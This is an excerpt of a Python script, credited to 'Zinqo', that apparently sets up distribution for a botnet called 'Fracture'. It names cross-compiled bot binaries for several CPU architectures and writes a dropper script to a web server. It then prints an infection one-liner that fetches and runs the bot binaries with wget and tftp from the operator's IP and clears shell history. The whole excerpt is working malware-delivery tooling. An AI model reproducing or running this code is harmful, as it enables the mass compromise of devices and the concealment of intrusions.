...
bot = sys.argv[1]
Fracture= raw_input("\x1b[1;95mReady To Install Cross Compilers? (Press Enter): \x1b[0m")
if Fracture.lower() == "":
    get_arch = True
else:
    get_arch = False
#Made By Zinqo.
compileas = ["m-i.p-s.Fracture" ,
             "m-p.s-l.Fracture" ,
             "s-h.4-.Fracture",
             "x-8.6-.Fracture",
             "a-r.m-6.Fracture",
...
run('echo -e "#!/bin/bash" > /var/www/html/Fracture.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/Fracture.sh')
...
#Made By Zinqo.
print("\x1b[1;95mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/Fracture.sh; chmod 777 *; sh Fracture.sh; tftp -g " + ip + " -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c\x1b[0m")
